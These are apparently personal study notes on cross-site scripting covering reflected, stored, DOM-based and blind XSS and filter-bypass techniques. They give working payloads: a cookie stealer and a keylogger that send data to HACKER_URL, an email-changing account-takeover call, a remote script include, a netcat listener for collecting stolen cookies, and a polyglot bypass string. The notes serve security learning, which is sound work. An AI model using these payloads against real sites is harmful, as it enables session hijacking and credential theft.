- injection attack where malicious JavaScript gets injected into a web application with the intention of being executed by other users
- the hello world of XSS: `<script>alert('XSS');</script>

# Use Cases
## Session Stealing

- user's session, such as login tokens, are often kept in cookies on the targets machine. 
- The below JavaScript takes the target's cookie, base64 encodes the cookie to ensure successful transmission and then posts it to a website under the hacker's control to be logged. 
- Once the hacker has these cookies, they can take over the target's session and be logged as that user.
- `<script>fetch('https://HACKER_URL/steal?cookie=' + btoa(document.cookie));</script>`

## Key Logging
- anything you type on the webpage will be forwarded to a website under the hacker's control
- useful for sensetive data like chats, login data, credit card information
- `<script>document.onkeypress = function(e) { fetch('https://HACKER_URL/log?key=' + btoa(e.key) );}</script>`

## Business Logic
- This payload is a lot more specific than the above examples. This would be about calling a particular network resource or a JavaScript function. For example, imagine a JavaScript function for changing the user's email address called `user.changeEmail()`
- `<script>user.changeEmail('mail@HACKER_URL');</script>`


# Reflected XSS
- user-supplied data in an HTTP request is included in the webpage source without any validation
- often in query parameters or url file paths which are "injected" in the source code

example:

url: `https://URL/?error=Invalid Request` (...url encoded)

website:
```html
<div class="error-alert">
	<p>Invalid Request</p>
</div>
```

malicious url:

website:  `https://URL/?error=<script src="https://HACKER_URL/xss.js"></script>` (...url encoded)
```html
<div class="error-alert">
	<p><script src="https://HACKER_URL/xss.js"></script></p>
</div>
```

1. Hacker sends link with malicious payload to user
2. user clicks on the link because it is a trusted url and user is taken to xss vulnareble website
3. link containing hackers script is executed on website
4. hacker gets notified and gets gathered data of the user


# Stored XSS
- XSS payload is stored on the web application (in a database, for example) and then gets run when other users visit the site or web page
- often in comments 

1. user write a malicious comment with an executable script
2. website's database stores the code
3. other users watching the comment section get the malicious code ecexuted on website
4. hacker gets notified and gets gathered data of the user


# DOM Based XSS
- DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction (see [Document Object Model DOM](../../Software-Engineering/Web/Document%20Object%20Model%20DOM.md))
- difficult to find and requires nore knowledge
- Example: The website's JavaScript gets the contents from the `window.location.hash` parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren't checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.
- finding a vulnarable page: need to look for parts of the code that access certain variables that an attacker can have control over, such as `window.location.x` parameters. -> hen need to see how they are handled and whether the values are ever written to the web page's DOM or passed to unsafe JavaScript methods such as `eval()`


# Blind XSS
- similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can't see the payload working or be able to test it against yourself first
- example: A website has a contact form where you can message a member of staff. The message content doesn't get checked for any malicious code, which allows the attacker to enter anything they wish. These messages then get turned into support tickets which staff view on a private web portal.

1. setup a listing server using netcat (or use a different tool): `nc -nlvp 9001` ()
2. enter XSS malicious code (maybe with bypass): `<script>fetch('http://{URL:9001}?cookie=' + btoa(document.cookie) );</script>`
3. look for netcat listings like
```
GET /?cookie=WFNTCg== HTTP/1.1
Host: URL:9001
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/89.0.4389.72 Safari/537.36
Accept: */*
Origin: VICTIM_URL
Referer: VICTIM_URL
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```
4. decode parameter `echo WFNTCg== | base64 -d`


# Bypass XSS

## Polyglots
- a string bypassing most of things
- it escapes attributes, tags and bypasses filters all in one

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e
```


## as Input Value

```html
<div class="text-center">
	<p>Hello, <input value="MALICIOUS_VALUE"></p>
</div>
```

... bypass with `"><script>alert('XSS');</script>`

```html
<div class="text-center">
	<p>Hello, <input value=""><script>alert('XSS');</script>"></p>
</div>
```

## surrounded with other tag

```html
<div class="text-center">
	<p>Hello, <textarea>MALICIOUS_VALUE</textarea></p>
</div>
```

... bypass with `</textarea><script>alert('XSS');</script>`

```html
<div class="text-center">
	<p>Hello, <textarea></textarea><script>alert('XSS');</script></textarea></p>
</div>
```


## within JavaScript Code

```html
<script>
	document.getElementsByClassName('name')[0].innerHTML='MALICIOUS_VALUE';
</script>
```

... bypass with `';alert('XSS');//` 

```html
<script>
	document.getElementsByClassName('name')[0].innerHTML='';alert('XSS');//';
</script>
```

## with replacements or filter
when e.g. the "script" is replaced with an empty string and we enter `<script>alert('XSS');</script>` as parameter

```html
<div class="text-center">
	<p>Hello, <>alert('XSS');</></p>
</div>
```

... bypass with `<sscriptcript>alert('THM');</sscriptcript>` 

```html
<div class="text-center">
	<p>Hello, <script>alert('XSS');</script></p>
</div>
```

## Image Selection
ehre you can select a picture and it takes the path of the image

```html
<div class="text-center">
	<h2>Your selected Picture</h2>
	<img src="/images/img.png">
</div>
```

```html
<div class="text-center">
	<h2>Your selected Picture</h2>
	<img src="MALICIOS_VALUE">
</div>
```

bypass with `/images/img.png" onload="alert('XSS');`

```html
<div class="text-center">
	<h2>Your selected Picture</h2>
	<img src="/images/img.png" onload="alert('XSS');">
</div>
```